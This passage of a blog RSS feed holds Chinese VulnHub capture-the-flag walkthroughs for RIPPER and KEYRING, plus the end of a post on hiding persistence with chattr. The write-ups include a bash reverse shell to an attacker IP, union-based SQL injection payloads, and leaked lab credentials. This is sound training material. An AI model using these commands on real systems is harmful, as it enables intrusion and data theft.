class=&#34;language-bash&#34;&gt;chattr锁定文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls -Alh /var/.hack &amp;amp;&amp;amp; chattr +i /var/.hack &amp;amp;&amp;amp; rm -f /var/.hack&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-329.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;检验是否权限维持成功&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-330.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;chattr-锁定文件权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#chattr-锁定文件权限&#34;&gt;#&lt;/a&gt; chattr 锁定文件权限&lt;/h3&gt;
&lt;p&gt;在 Linux 中，使用 chattr 命令来防止 root 和其他管理用户误删除和修改重要文件及目录，此权限用 ls -l 是查看不出来的，从而达到隐藏权限的目的。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;锁定文件&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chattr +i evil.php &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;属性查看&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lsattr evil.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;解除锁定&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chattr -i evil.php &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;删除文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm -rf 1.evil.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;chattr 锁定权限，通过解锁才能删除&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/121%20RIPPER/</guid>
            <title>VULNHUB 21 RIPPER</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/121%20RIPPER/</link>
            <category>VULNHUB 21-30</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmlwcGVyLTEsNzA2Lw==&#34;&gt;https://www.vulnhub.com/entry/ripper-1,706/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ3ODE2L2FydGljbGUvZGV0YWlscy8xMjMzMzI1ODI=&#34;&gt;https://blog.csdn.net/qq_42947816/article/details/123332582&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 RIPPER：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-480.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.84&lt;/p&gt;
&lt;p&gt;2）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.115&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-481.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80,10000&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODQ=&#34;&gt;http://192.168.31.84&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-482.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.84&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-483.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有什么新发现，先不管 80 端口的 web&lt;br&gt;
 查看网站:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODQ6MTAwMDA=&#34;&gt;http://192.168.31.84:10000&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-484.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示会跳转到 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw&#34;&gt;https://ripper-min:10000&lt;/span&gt;&lt;br&gt;
 修改本地 hosts 文件，将 url 地址改为目标靶机 ip 地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-485.png&#34; width=&#34;290&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;进入到页面 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw&#34;&gt;https://ripper-min:10000&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-486.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一个 webmin 的登陆页面，收集此网站的相关信息&lt;/p&gt;
&lt;h3 id=&#34;robots-页面查看&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#robots-页面查看&#34;&gt;#&lt;/a&gt; robots 页面查看&lt;/h3&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAwL3JvYm90cy50eHQ=&#34;&gt;https://ripper-min:10000/robots.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-487.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到一个提示，采用的 base64 加密，解密后得到一个关键词 “rips”&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-488.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接将 rips 拿到谷歌上搜索，它是一个做代码分析的工具&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-489.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;进入到 rips 官网得知，其安装下载之后的目录在 /rips/ 里边&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-490.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在原来的 url 地址上拼接上 rips 看是否能有新发现:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAwL3JpcHM=&#34;&gt;https://ripper-min:10000/rips&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-491.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 此页面并没有任何反应，别忘了我们还有一个 80 端口&lt;/p&gt;
&lt;h3 id=&#34;rip-扫描-web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rip-扫描-web&#34;&gt;#&lt;/a&gt; rip 扫描 web&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xOTIuMTY4LjMxLjg0L3JpcHMv&#34;&gt;https://192.168.31.84/rips/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-492.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;进入到了 rips 代码审计的界面，看样子需要填一个 path，根据要求填写为 /var/www 后点击扫描&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-493.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;扫描到了一些漏洞，并且看到了一个敏感文件 secret.php，点击 secret.php 文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-494.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到了泄漏出来的账户和密码 ripper:Gamespeop&lt;/p&gt;
&lt;h3 id=&#34;可访问文件筛选&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可访问文件筛选&#34;&gt;#&lt;/a&gt; 可访问文件筛选&lt;/h3&gt;
&lt;p&gt;爆出来的密码可能是 ssh 连接的密码，也可能是网站后台密码，通过 ssh 连接判断是否能登陆到对方的服务器上&lt;br&gt;
 &lt;code&gt;ssh 192.168.31.84 -l ripper&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-495.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到 ripper 的权限，尝试去拿 root 账户的权限&lt;/p&gt;
&lt;p&gt;查询目录结构，看到出了 ripper 之外的另外一个用户 cubes&lt;br&gt;
 查看出了基础的几个基本目录后，是否有其他文件是这两个用户能操作的&lt;br&gt;
 &lt;code&gt;find / -user ripper 2&amp;gt;/dev/null | grep -v “proc\|home\|run\|sys”&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;find / -user cubes 2&amp;gt;/dev/null | grep -v “home”&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-496.png&#34; width=&#34;610&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现 cubes 可以操作的文件有一个 secret.file 文件，查看后得到密码&lt;br&gt;
 su cubes 输入密码后成功拿到了 cubes 的权限&lt;/p&gt;
&lt;p&gt;借助 find 来寻找属于用户 cubes 可以操作的文件&lt;br&gt;
 &lt;code&gt;find / -user cubes 2&amp;gt;/dev/null | grep -v “home\|proc”&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-497.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;备份文件泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#备份文件泄露&#34;&gt;#&lt;/a&gt; 备份文件泄露&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;cat /var/webmin/backup/miniser.log&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-498.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 找到了敏感信息 webmin 的账户和密码：admin:tokiohotel&lt;/p&gt;
&lt;p&gt;进入 webmin 的网站后台登陆地址，输入账户密码进入后台 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw&#34;&gt;https://ripper-min:10000&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-499.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在后台中发现有个 terminal 的标志，直接点击此按钮&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-500.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;后台反弹-shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#后台反弹-shell&#34;&gt;#&lt;/a&gt; 后台反弹 shell&lt;/h3&gt;
&lt;p&gt;点击后在 web 页面就会弹出来一个终端窗口，而且是 root 权限的&lt;/p&gt;
&lt;p&gt;但是在 web 界面操作并不是很方遍，接下来把此 shell 进行反弹&lt;br&gt;
 &lt;code&gt;bash - c ‘bash -I &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1’&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-501.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;接受反弹的shell，并且美化终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-502.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 最后拿到了一个 root 账户的标准 shell&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/123%20KEYRING/</guid>
            <title>VULNHUB 23 KEYRING</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/123%20KEYRING/</link>
            <category>VULNHUB 21-30</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEta2V5cmluZy0xMDEsNzE4Lw==&#34;&gt;https://www.vulnhub.com/entry/ia-keyring-101,718/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hsanp6ai9hcnRpY2xlL2RldGFpbHMvMTIyOTUyMzcz&#34;&gt;https://blog.csdn.net/hljzzj/article/details/122952373&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 KEYRING：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-524.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.127&lt;/p&gt;
&lt;p&gt;2）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.208&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-525.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4&#34;&gt;http://192.168.31.208&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-526.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;是一个注册登陆的界面，直接输入 12345:12345 注册一个账户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-527.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将注册的账户通过 login 界面登陆进去&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-528.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;登陆后的页面中 Home 是欢迎 12345 用户的信息，下面显示了时间&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-529.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 control 页面，显示的是一个 HPP 参数污染的提示&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-530.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目前得到的信息并不能进行攻击，需要寻找更多的信息&lt;br&gt;
对目标网址进行路径扫描，寻找更多的信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.208&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-531.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;dirsearch 并没有加载出来有利用价值的信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.208&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-532.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; gobuster 扫描出来了一个 history.php 的路径&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhw&#34;&gt;http://192.168.31.208/history.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-533.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;wfuzz-爆破参数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz-爆破参数&#34;&gt;#&lt;/a&gt; wfuzz 爆破参数&lt;/h3&gt;
&lt;p&gt;提示说没有找到活跃的用户，猜测这里是因为没有登陆用户的原因&lt;br&gt;
找到登陆页面，登陆我们之前注册的用户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-534.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;重新打开 history.php 页面，提示信息变成了空白的，说明用户登陆对此页面的回显结果是有影响的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-535.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;很明显这个 history.php 的文件是存在问题的，怀疑后面是否有参数地址&lt;br&gt;
可以用 wfuzz 进行爆破参数地址试试&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.31.208/history.php?FUZZ=xxx&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-536.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 发现全是 200 ，那就不能用 wfuzz 测试参数了，需要用其他的方式&lt;/p&gt;
&lt;h3 id=&#34;模糊测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#模糊测试&#34;&gt;#&lt;/a&gt; 模糊测试&lt;/h3&gt;
&lt;p&gt;之前收集到的信息中有一句话 “can’t find this user’s activity”，尝试 user 参数&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4=&#34;&gt; http://192.168.31.208/history.php?user=admin&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-537.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;爆出来了源码 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2dpdGh1Yi5jb20vY3liZXJib3Q3NS9rZXlyaW5n&#34;&gt;http://github.com/cyberbot75/keyring&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-538.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;手工sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#手工sql注入&#34;&gt;#&lt;/a&gt; 手工 sql 注入&lt;/h3&gt;
&lt;h4 id=&#34;判断是否是注入点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#判断是否是注入点&#34;&gt;#&lt;/a&gt; 判断是否是注入点&lt;/h4&gt;
&lt;p&gt;对 history.php 所在的 url 地址尝试手工判断是否是注入点&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjBhbmQlMjAxPTEtLSs=&#34;&gt; http://192.168.31.208/history.php?user=admin&#39; and 1=1--+&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;and 1=1 --+ 被执行，and 1=2 --+ 报错，是注入点&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-539.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h4 id=&#34;猜字段数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#猜字段数&#34;&gt;#&lt;/a&gt; 猜字段数&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMDEtLSs=&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select 1--+&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;猜字段有多少个，1 时是正确的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-540.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMDEsMi0tKw==&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select 1,2--+&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1,2 时报错了，说明只能爆出来一个字段&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-541.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
&lt;h4 id=&#34;猜当前数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#猜当前数据库&#34;&gt;#&lt;/a&gt; 猜当前数据库&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4=&#34;&gt;http://192.168.31.208/history.php?user=admin&lt;/span&gt;’ union select database()–+&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-542.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;数据库名是 users&lt;/p&gt;
&lt;h4 id=&#34;猜数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#猜数据库&#34;&gt;#&lt;/a&gt; 猜数据库&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdChzY2hlbWFfbmFtZSklMjBmcm9tJTIwaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhLS0r&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select group_concat(schema_name) from information_schema.schemata--+&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;group_concat(schema_name) from information_schema.schemata–+&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-543.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一共有四个数据库 information_schema,mysql,performance_schema,sys,users&lt;/p&gt;
&lt;h4 id=&#34;猜表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#猜表&#34;&gt;#&lt;/a&gt; 猜表&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSUyMGZyb20lMjBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzJTIwd2hlcmUlMjB0YWJsZV9zY2hlbQ==&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select group_concat(table_name) from information_schema.tables where table_schem&lt;/span&gt;&lt;br&gt;
a=%27users%27–+&lt;/p&gt;
&lt;p&gt;group_concat(table_name) from information_schema.tables where&lt;br&gt;
table_schema=‘users’–+&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-544.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;数据库 user 下有两个表：details,log&lt;/p&gt;
